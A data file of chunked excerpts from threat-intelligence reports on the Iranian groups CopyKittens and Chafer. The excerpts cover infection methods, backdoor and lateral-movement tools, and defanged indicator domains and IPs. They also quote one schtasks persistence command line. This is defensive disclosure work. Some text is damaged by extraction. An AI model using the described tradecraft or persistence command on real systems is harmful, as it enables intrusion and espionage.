we estimate that there have been at least a few hundred people infected in multiple organizations in the targeted countries."|data_input/Oilrig_reports/entry_0175142c-6ad1-4f27-8fde-7f319f6b29bf.text|250bdd0b625848f999a256099eebb877
"After infecting a computer within a target organization, the attacker would move latterly using one of the malware descried in chapter ""Malware."" It seems that their objective is to gather as much information and data from target organizations as possible. They would indiscriminately exfiltrate large amounts of documents, spreadsheets, file containing personal data, configuration files and databases. In at least one case, the attackers breached an IT company, and used VPN access it had to client organizations to breach their networks. Often, victim organizations would learn of the breach due to the non-stealthy behavior of the attackers. The attackers would ""get greedy,"" infecting multiple computers within the network of breached organizations. This would raise an alarm in various defense systems, making the victims initiate incident response operations.

Delivery and Infection CopyKittens attack their targets using the following methods: •

Watering hole attacks – inserting malicious JavaScript code into breached strategic websites.

Web based exploitation – emailing links to websites built by the attackers and containing known exploits.

Malicious documents – email attachments containing weaponized Microsoft Office documents.

Fake social media entities – fake personal and organizational Facebook pages are used for interaction with targets and for information gathering."|data_input/Oilrig_reports/entry_0175142c-6ad1-4f27-8fde-7f319f6b29bf.text|a254440520694fcbaca10437c7af4d80
"Fake social media entities – fake personal and organizational Facebook pages are used for interaction with targets and for information gathering.

Web hacking – Havij, Acuntix and sqlmap are used to detect and exploit internet-facing web servers.

These methods are elaborated below.

Watering Hole Attacks On 30 March 2017, ClearSky reported a breach of multiple websites, such as Jerusalem Post, Maariv news and the IDF Disabled Veterans Organization website.4 JavaScript code was inserted into the breached websites, loading BeEF (Browser Exploitation Framework) from domains owned by the attackers .5 For example:

"Malicious code added to Maariv website

The malicious code was loaded from one of the following addresses: https://js.jguery[. ]net/jquery.min.js https://js.jguery[. ]online/jgueryui.min.js This would enable the attackers to perform actions such as browser fingerprinting and information gathering, social engineering attacks (like asking for credentials, redirect to another page, asking the user to install a malicious extension or malware), network reconnaissance, infecting the computer using Metasploit exploits, and more.6 The malicious code was served only when specific targets visited the website, likely based on IP whitelisting. Notably, prior to that publication, the German Federal Office for Information Security (BSI) said in a statement that it had investigated ""problems in network traffic"" of the German Bundestag.7 The statement concluded that the website of Israeli newspaper Jerusalem Post was manipulated and linked to a harmful third party in January 2017.

"Web-Based Exploitation In two incidents, the attackers breached the mailbox of a person related to a target organization. From this (real) account, they replied to previous correspondences with these organizations, adding a malicious link to a website registered and built by attackers: primeminister-goverment-techcenter].[tech. 8 JavaScript code, at least parts of which were copied from public sources, fingerprinted the visitor's web browser.9 This was likely used for later browser exploitation with known vulnerabilities. In some pages the code enumerates and collects a list of installed browser plugins, in others it tries to detect the real IP of the computer:

"JavaScript and Java code loaded into webpage, victim is redirected after 20 seconds

Malicious Documents The attackers use three document based exploitation types: exploiting CVE-2017-0199, embedding OLE objects, and macros. If the victim opens a document and the exploitation is successful (in the latter two, user interaction might be required), the attackers would receive access to the computer via self-developed or publicly available malware (see ""Malware"" chapter for more details).

Exploiting CVE-2017-0199 On 26 April 2017, a malicious email was sent from an employee account that was likely breached within the Ministry of Northern Cyprus. It was sent to a disclosed recipients list in government institutions in several countries and other organizations, mostly in or related to ministries of foreign affairs. We should note, however, that it is possible that the attackers were interested only in a few of the recipient organizations, but sent it to a wider list because they showed up in previous correspondences in the breached account. Recipients were in the following domains: mofa.gov.vn mfa.gov.sg mfa.gov.tr post.mfa.uz mfa.am mfa.gov.by beijing.mfa.gov.il mofat.go.kr mfa.no

Noteworthy observations about the domains: • Domains impersonate one of four categories: ▪ Major internet and software companies and services – Microsoft, Google, Akamai, Cloudflare, Amazon, Oracle, Facebook, Cisco, Twitter, Intel ▪ Security companies and products – Trend Micro, McAfee, Microsoft Defender, and potentially Cellebrite ▪ Israeli organizations of interest to the victim – News originations, Israeli Prime Minister Office, an Israeli ISP ▪ Other organizations or generic web services • The attackers always use Whoisguard for Whois details protection.33 • Domains are usually registered in bulk every few months. • Long subdomains are created like those used by Content Delivery Networks. For example: wk-in-f104.1e100.n.microsoft-security[. ]host ns1.static.dyn-usr.gsrv01.ssl-gstatic[. ]online c20.jdk.cdn-external-ie.1e100.alkamaihd[. ]net msnbot-sd7-46-194.microsoft-security[. ]host ns2.static.dyn-usr.gsrv02.ssl-gstatic.online static.dyn-usr.g-blcse.d45.a63.alkamaihd[. ]net ea-in-f155.1e100.microsoft-security[. ]host is-cdn.edge.g18.dyn.usr-e12-as.akamaitechnology[. ]com static.dyn-usr.f-login-me.c19.a23.akamaitechnology[. ]com pht.is.nlb-deploy.edge-dyn.e11.f20.ads-youtube[. ]online ae13-0-hk2-96cbe-1a-ntwk-msn.alkamaihd[. ]com be-5-0-ibr01-lts-ntwk-msn.alkamaihd[. ]com a17-h16.g11.iad17.as.pht-external.c15.qoldenlines[. ]net • Some of the domains have been in use for more than two years.

Often the attackers would point malicious domains to IPs not in their control. For example, as can be seen in the screenshot below from PassiveTotal, multiple domains and hosts (marked red) were pointed to a nonmalicious IP owned by Google.3435

Multiple domains and hosts pointing to a non-malicious IP owned by Google

This pattern was instrumental for us in pivoting and detecting further malicious domains.

"Malware In this chapter we analyze and review malware used by CopyKittens.

TDTESS Backdoor TDTESS (22fd59c534b9b8f5cd69e967cc51de098627b582) is 64-bit .NET binary backdoor that provides a reverse shell with an option to download and execute files. It routinely calls in to the command and control server for new instructions using basic authentication. Commands are sent via a web page. The malware creates a stealth service, which will not show on the service manager or other tools that enumerate services from WINAPI or Windows Management Instrumentation."|data_input/Oilrig_reports/entry_0175142c-6ad1-4f27-8fde-7f319f6b29bf.text|632893181b6348f38c844122f32fec47
"Installation and removal TDTESS can run as either an interactive or non-interactive (service) program. When called interactively, it receives one of the two arguments: installtheservice to install itself or uninstalltheservice to remove itself. The arguments are described below: installtheservice If running with administrator privileges, it will install a service with the following characteristics: Key name: bmwappushservice Display name: bmwappushsvc Description: WAP Push Message Routing Service Type: own (runs in its own process) Start type: auto (starts each time the computer is restarted and runs even if no one logs on to the computer) Path: <main executable path> (In our analysis: c:\Users\PC008\Desktop\t.exe) Security descriptor: D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLC SWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;F A;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

Service information from command

line using sc tool

The hardcoded security descriptor used to create the service is a persistence technique. Interactive users, even if they are administrators, cannot stop or even see the service in services.msc snap-in.

Following is a list of denied commands: service_change_config service_query_status service_stop service_pause_continue delete

Service information in Registry"|data_input/Oilrig_reports/entry_0175142c-6ad1-4f27-8fde-7f319f6b29bf.text|e1f7296366b24cc4a5600ec5db94a7df
"Service information in Registry

Two log files are created during the service installation, but deleted by the program. Following is their recovered content:

InstallUtil.InstallLog

<filename>.t.InstallLog

After creating the service, it will update the file creation time to that of the following file: %windir%\system32\svchost.exe

Page 28 of 48 ©All rights reserved to ClearSky cyber security and Trend Micro, 2017

uninstalltheservice If running with administrator privileges, it will uninstall the said service, create log files and then deletes them.

InstallUtil.InstallLog

<filename>.t.InstallLog

Because the service installing mechanism appears to be default for .NET programs, the creator of the tool deletes the log files right after they are created. If no argument is given when called interactively, the program terminates itself.

Functionality The service is started immediately after installation. After five minutes, it verifies internet connectivity by making a HTTP HEAD request to microsoft.com. Then it tries to access the C&C servers looking for commands.

Hardcoded HTTP parameters and URL

As a reply, TDTESS expects one of the following Bas64 encoded commands: getnrun - download and execute a file. Parameters are drop, drop_path and t. runnreport - send information about the computer. Parameters are cmd and boss. wait - time to next interval to get data."|data_input/Oilrig_reports/entry_0175142c-6ad1-4f27-8fde-7f319f6b29bf.text|2cfc3893a0c84ca6b303074ce3227671

Vminst for Lateral Movement Vminst (a60a32f21ac1a2ec33135a650aa8dc71) is a lateral movement tool used to infect hosts in the network using previously stolen credentials. It Injects Cobalt Strike into memory of infected hosts. The binary implements ServiceMain and is intended to be installed as a service named “sdrsrv.” When it functions as a service, it injects Cobalt Strike beacon into its own process (which is 32-bit “svchost”) or creates a new 32-bit “rundll32” process and injects the beacon into the new process. The injection method depends on the parameter received when the service was created. It is configured to open a new “rundll32” process in suspend-mode and create a remote thread which executes a Cobalt Strike beacon or shellcode. The binary has the option to run and load itself in memory. It also has the option to be executed through its exported function ""v,"" which gets a base64 string parameter built as follows: Base-64-Encode(“/mv /OptionalCommand”) OptionalCommand can be one of the following: •

Matryoshka v1 – RAT Matryoshka v1 is a RAT analyzed in the 2015 report by ClearSky and Minerva.38 It uses DNS for command and control communication, and has common RAT capabilities such as stealing Outlook passwords, screen grabbing, keylogging, collecting and uploading files, and giving the attacker Meterpreter shell access. We have seen this version of Matreyoshka in the wild from July 2016 until January 2017. The Matryoshka.Reflective_Loader injects the module Matryoshka.Rat, which has the same persistence keys and communication method described in the original report.

Upon starting it will inject the communication module to all available processes (with the same run architecture and the same or lower level of permission). The inner name of Svchost’s is Injector.dll. The next stage, in memory, is ReflectiveDLL.dll.

ZPP – File Compressor ZPP (bcae706c00e07936fc41ac47d671fc40) is a .NET console program that compresses files with the ZIP algorithm. It can transfer compressed files to a remote network share. Command line options are as follows: -I - File extension to compress (i.e. : .txt) -s - Source directory -d - Destination directory -gt - Greater than creation timestamp -lt - Lower than creation timestamp -mb - Unimplemented -o - Output file name -e - File extension to skip (except)

ZPP"|data_input/Oilrig_reports/entry_0175142c-6ad1-4f27-8fde-7f319f6b29bf.text|066c0992a47e4f8c9e31200c4db29961
"ZPP

ZPP will recursively read all files in the source directory to compress them with the maximum compression rate if their names match the extension pattern given (-i). The compressed ZIP file is written to the output directory (-d). If no output file name is set, ZPP will use the mask zpp<random_number>.out. <file_number>. For example:

Filename is zpp5077.out0

The file compilation timestamp is Tue, 05 Jul 2016 17:22:59 UTC. ad09feb76709b825569d9c263dfdaaac is a previous version (compilation timestamp: Sat, 09 Jan 2016 17:02:38 UTC) and is only different in that it accepts the –e switch, which ignored by the program logic. 214be584ff88fb9c44676c1d3afd7c95 is the newest version (compilation timestamp: Mon, 26 Sep 2016 19:49:34 UTC). It is supposed to implement the –s switch but although it is set when the user gives it to the program, the switch is ignored by the code.

ZPP version 2.0

ZPP seems to be under development. All versions have bugs. It uses the reduced version of DotNetZip library. 39 Therefore, it requires Ionic.Zip.Reduced.dll (7c359500407dd393a276010ab778d5af) to be under the same directory or %PATH%. Function doCompressInNetWorkDirectory() is intended to exfiltrate date from a target machine to a network share.

Cobalt Strike Cobalt Strike is a publicly available commercial software for ""Adversary Simulations and Red Team Operations. ""40 While not malicious in and of itself, it is often used by cybercrime groups and state-sponsored threat groups, due to its post-exploitation and covert communication capabilities. 41 4243 44 CopyKittens use the free 21-day trial version of Cobalt Strike. Thus, malicious communication generated by the tool is much easier to detect, because a special header is sent in each HTTP GET transaction. The special header is ""X-Malware,"" i.e. there is a literal indication that ""this network communication is malicious."" All that

THREAT INTELLIGENCE (/BLOGS/THREAT

INTELLIGENCE)

Chafer: Latest Attacks Reveal Heightened Ambitions Iran-based group remains highly active and is moving up the telecoms and transport supply chain to facilitate widescale surveillance of targets. Chafer, the Iran-based targeted attack group, mounted further operations throughout 2017, attacking more organizations in the Middle East and beyond, and deploying several new tools. The group staged a number of ambitious new attacks last year, including the compromise of a major telecoms services provider in the region. There is also evidence that it attempted to attack a major international travel reservations rm. Chafer appears to be primarily engaged in surveillance and tracking of individuals, with most of its attacks likely carried out to gather information on targets or facilitate surveillance. Chafer has been active since at least July 2014 and its activities were rst exposed by Symantec in December 2015 (https://www.symantec.com/connect/blogs/iran-based-attackers-use-back-door-threats-spy-middle-eastern-targets), when it was found to be conducting targeted surveillance of domestic and international targets. At the time, many of its targets were individuals located in Iran, and it had already begun compromising telecom providers as well as airline companies in the Middle East region."|data_input/Oilrig_reports/entry_bac6257f-657e-4fd5-b18b-7bd0e619511f.text|872f2643f3844f6cb7e423ef6f35a897

Expansion of operations Chafer appears to have been undeterred by its exposure in 2015 and continued to be very active during 2017, using seven new tools, rolling out new infrastructure, and attacking nine new target organizations in the region. The group hit organizations in Israel, Jordan, the United Arab Emirates, Saudi Arabia, and Turkey. Sectors targeted included airlines; aircraft services; software and IT services companies serving the air and sea transport sectors; telecoms services; payroll services; engineering consultancies; and document management software. Outside of the Middle East, Symantec has also found evidence of attacks against one African airline and attempts to compromise an international travel reservations rm.

Ambitious new targets One of the organizations compromised by Chafer in 2017 was a telecoms services provider in the Middle East, which sells its solutions to multiple telecoms operators in the region. The ultimate goal of the attack may have been to facilitate surveillance of end-user customers of telecoms operators. By moving two steps up the supply chain the attackers could potentially have carried out surveillance on a vast pool of end-users."|data_input/Oilrig_reports/entry_bac6257f-657e-4fd5-b18b-7bd0e619511f.text|b945904296f34ae4b312aced5ff1e114
"Alongside evidence of compromise of the organization itself, Symantec also found a copy of one of the company’s own les, relating to its messaging software, on a staging server used by Chafer. The le was in a directory alongside a number of hacking tools used by the attackers. A second target outside the Middle East provides further con rmation of Chafer’s heightened ambitions in recent times. Symantec found evidence that it had tried to compromise a large international travel reservations rm. There was no indication that the attack was successful, but Chafer did successfully in ltrate an African airline that is a customer of the reservations rm.

How Chafer infects targets In the earlier attacks from 2015, Symantec found evidence that Chafer had been compromising targeted organizations by attacking their web servers, likely through SQL injection attacks, in order to drop malware onto them. In 2017, the group added a new infection method to its toolkit, using malicious documents which are likely circulated using spear-phishing emails sent to individuals working in targeted organizations. These documents were Excel spreadsheets. When opened, they downloaded a malicious VBS le that in turn ran a PowerShell script. Several hours later, a dropper would appear on the compromised computer. This would install three les on the computer, an information stealer, a screen capture utility, and an empty executable. The screen capture utility appeared to be used for initial information gathering, as it was only used brie y at the beginning of each infection and not seen again. The information stealer was capable of stealing the contents of the clipboard, taking screenshots, recording keystrokes and stealing les and user credentials. After this initial activity, the attackers usually downloaded more of their tools to the computer using a PowerShell downloader and began moving across the victim’s network.|data_input/Oilrig_reports/entry_bac6257f-657e-4fd5-b18b-7bd0e619511f.text|3353c93459a74112b66f0ed0188d87c9
New tools used to compromise networks Symantec has seen Chafer use seven new tools in its more recent campaigns, in addition to malware it is previously known to have used. Most of the new tools are freely available, off-the-shelf tools, put to a malicious use. The new tools include: Remcom: An open-source alternative to PsExec, which is a Microsoft Sysinternals tool used for executing processes on other systems. Non-sucking Service Manager (NSSM): An open-source alternative to the Windows Service Manager which can be used to install and remove services and will restart services if they crash. A custom screenshot and clipboard capture tool. SMB hacking tools: Used in conjunction with other tools to traverse target networks. These tools include the EternalBlue exploit (which was previously used by WannaCry and Petya). GNU HTTPTunnel: An open-source tool that can create a bidirectional HTTP tunnel on Linux computers, potentially allowing communication beyond a restrictive rewall. UltraVNC: An open-source remote administration tool for Microsoft Windows. NBTScan: A free tool for scanning IP networks for NetBIOS name information.|data_input/Oilrig_reports/entry_bac6257f-657e-4fd5-b18b-7bd0e619511f.text|d6795a63baef4af2a49bc716cd873df2
Chafer has also continued to use tools previously associated with the group, including its own custom backdoor Remexi (Backdoor.Remexi (https://www.symantec.com/security_response/writeup.jsp?docid=2015-110911-3433-99)); the aforementioned PsExec; Mimikatz (Hacktool.Mimikatz (https://www.symantec.com/security_response/writeup.jsp?docid=2012-042615-3731-99)), a free tool capable of changing privileges, exporting security certi cates, and recovering Windows passwords in plaintext; Pwdump (Pwdump (https://www.symantec.com/security_response/writeup.jsp? docid=2005-032616-0025-99)) a tool that is used to grab Windows password hashes from a remote Windows computer; and Plink (PuTTY Link) a command-line utility used to create reverse SSH sessions. Chafer has used these tools in concert to traverse targeted networks. The group has recently adopted NSSM to maintain persistence and install the service which runs Plink on the compromised computer. Plink is then used to open reverse SSH sessions from the attacker's server to the RDP port on the victim computer. This presumably gives them RDP access to the compromised computer. Once a foothold is established, the attackers use PsExec, Remcom, and SMB hacking tools to begin moving across the victim’s network.|data_input/Oilrig_reports/entry_bac6257f-657e-4fd5-b18b-7bd0e619511f.text|24a7e3d0de834103a01cbc3e632de1d9
"New infrastructure in use Chafer has also begun using new infrastructure. The domain win7-updates[. ]com is being used by the group as a command and control address. The domain has been referenced several times in command lines, e.g:

s224.win7-update[. ]com s5060.win7-update[. ]com s21.win7-update[. ]com It has also been embedded in a dropper: hxxp://wsus65432.win7-update[. ]com Symantec also discovered multiple IP addresses that were used as infrastructure by the attackers. It is unclear whether these were leased or hijacked, but the fact that many of them appear to follow a pattern—with the latter three numbers of each address often running in sequence—makes it likely they were deliberately selected by the attackers. 107.191.62[. ]45 94.100.21[. ]213 89.38.97[. ]112 148.251.197[. ]113 83.142.230[. ]113 87.117.204[. ]113 89.38.97[. ]115 87.117.204[. ]115 185.22.172[. ]40 92.243.95[. ]203 91.218.114[. ]204 86.105.227[. ]224 91.218.114[. ]225 134.119.217[. ]84 In one case, Symantec found what appeared to be a staging server used by the attackers. The server belonged to one of the targeted organizations. Copies of many of the tools used by the group were discovered on the server. The attackers didn’t even bother hiding their activity and saved items to the desktop, often without renaming them."|data_input/Oilrig_reports/entry_bac6257f-657e-4fd5-b18b-7bd0e619511f.text|84eb6a0759564bc3b159fe2092559546
"Links to Crambus? Chafer’s activities have some links to another group known as Crambus (aka Oilrig). Both groups have been observed using the same IP address for command and control purposes. In addition to this, both groups have been seen using a similar infection vector, namely an Excel document which drops a malicious VBS le. Both VBS les reference the same le path, containing the same misspelling: “schtasks.exe /create/ F /sc minute /mo 2 /tn ""UpdatMachine"" /tr %LOCALAPPDATA%\microsoft\Feed\Y658123.vbs” Are the two groups one and the same? While this may be a possibility, at present there isn’t enough evidence to support that hypothesis. What is more likely is that the two groups are known to each other and enjoy access to a shared pool of resources."|data_input/Oilrig_reports/entry_bac6257f-657e-4fd5-b18b-7bd0e619511f.text|7efbd4295858406c8d54b43f32c4180e
"Growing threat to organizations in the Middle East Chafer’s recent activities indicate that the group remains highly active, is continuing to hone its tools and tactics, and has become more audacious in its choice of targets. Although a regional actor, the group has followed two trends seen globally among targeted attack groups. The rst is a greater reliance on freely available software tools, also known as “living off the land.” By limiting their use of malware, groups such as Chafer hope to be less conspicuous on a victim’s network and, if discovered, make their attack more di cult to attribute. The second trend is towards attacks on the supply chain, compromising organizations with the goal of then attacking the customers, or even the customers of the customers, of those organizations. These attacks require more “steps” to reach their ultimate target, which adds additional time and risk for attackers to reach their targets. However these attacks also leverage trusted channels into the eventual target, e.g., through a trusted supplier, allowing attackers to potentially circumvent security systems at the organization they ultimately wish to compromise. These attacks are riskier but come with a potentially higher reward and, if successful, could give the attackers access to a vast pool of potential targets.
